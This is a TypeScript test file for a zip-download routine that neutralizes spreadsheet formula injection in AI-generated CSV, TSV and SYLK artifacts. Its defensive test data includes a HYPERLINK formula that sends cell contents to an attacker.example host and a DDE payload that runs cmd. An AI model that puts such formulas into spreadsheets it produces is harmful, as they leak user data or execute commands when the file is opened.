import JSZip from 'jszip';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { createArtifactsZip, type DownloadableArtifact } from './downloadArtifacts';

const HYPERLINK = '=HYPERLINK("http://attacker.example/steal?u="&A1)';
const DDE = "=cmd|'/c calc'!A0";

afterEach(() => {
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
});

async function zipEntry(artifact: DownloadableArtifact, fileName: string): Promise<string> {
  const archive = await JSZip.loadAsync(await createArtifactsZip([artifact]));
  const entry = archive.file(fileName);
  expect(entry).not.toBeNull();
  return entry!.async('string');
}

describe('createArtifactsZip · CSV formula neutralization', () => {
  it('neutralizes a formula when the model-controlled language names the entry .csv', async () => {
    const body = await zipEntry(
      { title: 'Q3 report', content: `victim,${HYPERLINK}`, language: 'csv' },
      'Q3 report.csv',
    );

    expect(body).toContain("'=HYPERLINK");
    expect(body).not.toContain(`,${HYPERLINK}`);
  });

  it('neutralizes a formula when only the model-chosen title ends in .csv', async () => {
    const body = await zipEntry({ title: 'report.csv', content: DDE }, 'report.csv');

    expect(body).not.toBe(DDE);
    expect(body.replace(/^"/, '')).toMatch(/^'/);
  });

  it('neutralizes a SYLK entry, a text format Excel opens and evaluates', async () => {
    const body = await zipEntry({ title: 'Q3', content: DDE, language: 'slk' }, 'Q3.slk');

    expect(body).not.toBe(DDE);
    expect(body.replace(/^"/, '')).toMatch(/^'/);
  });

  it('neutralizes a tab-separated entry with the tab delimiter preserved', async () => {
    const body = await zipEntry(
      { title: 'Q3', content: `victim\t${DDE}`, language: 'tsv' },
      'Q3.tsv',
    );

    expect(body).toBe(`victim\t'${DDE}`);
  });

  it('leaves a benign table byte-identical', async () => {
    const content = 'name,score\nAlice,30\nBob,-7';
    const body = await zipEntry({ title: 'Q3', content, language: 'csv' }, 'Q3.csv');

    expect(body).toBe(content);
  });

  it('guards the record a lone CR starts inside a zipped .csv', async () => {
    const body = await zipEntry(
      { title: 'Q3', content: `victim,1\r${DDE}`, language: 'csv' },
      'Q3.csv',
    );

    expect(body).toBe(`victim,1\r'${DDE}`);
  });

  it('guards a payload a leading number is glued to', async () => {
    const content = "victim,note\n-1,2+cmd|'/c calc'!A0";
    const body = await zipEntry({ title: 'Q3', content, language: 'csv' }, 'Q3.csv');

    expect(body).not.toBe(content);
    expect(body).toBe("victim,note\n'-1,2+cmd|'/c calc'!A0");
  });

  it('guards a tab-delimited entry an importer would auto-detect', async () => {
    const body = await zipEntry(
      { title: 'Q3', content: `victim\t${DDE}`, language: 'csv' },
      'Q3.csv',
    );

    expect(body).toBe(`victim\t'${DDE}`);
  });

  it.each(['name,,city\r\nA,B\r\n1,2,3,4\r\n\r\n', ' name ; score \nAlice;30\n'])(
    'zips %j exactly as the model wrote it',
    async (content) => {
      expect(await zipEntry({ title: 'Q3', content, language: 'csv' }, 'Q3.csv')).toBe(content);
    },
  );

  it('leaves a non-spreadsheet entry untouched', async () => {
    const body = await zipEntry({ title: 'notes', content: '=1+1', language: 'md' }, 'notes.md');

    expect(body).toBe('=1+1');
  });

  it('never reparses persisted generated-file bytes', async () => {
    const bytes = new Uint8Array([0x50, 0x4b, 0x03, 0x04, 0x2c, 0x3d, 0x31, 0x2b, 0x31]);
    vi.stubGlobal(
      'fetch',
      vi.fn(async () => ({ ok: true, status: 200, arrayBuffer: async () => bytes.buffer })),
    );

    const archive = await JSZip.loadAsync(
      await createArtifactsZip([
        {
          title: 'Q3 report.xlsx',
          content: '',
          language: 'xlsx',
          generatedFile: {
            uri: '/api/files/11111111-2222-4333-8444-555555555555',
            fileName: 'Q3 report.xlsx',
          },
        },
      ]),
    );

    expect(await archive.file('Q3 report.xlsx')!.async('uint8array')).toEqual(bytes);
  });
});
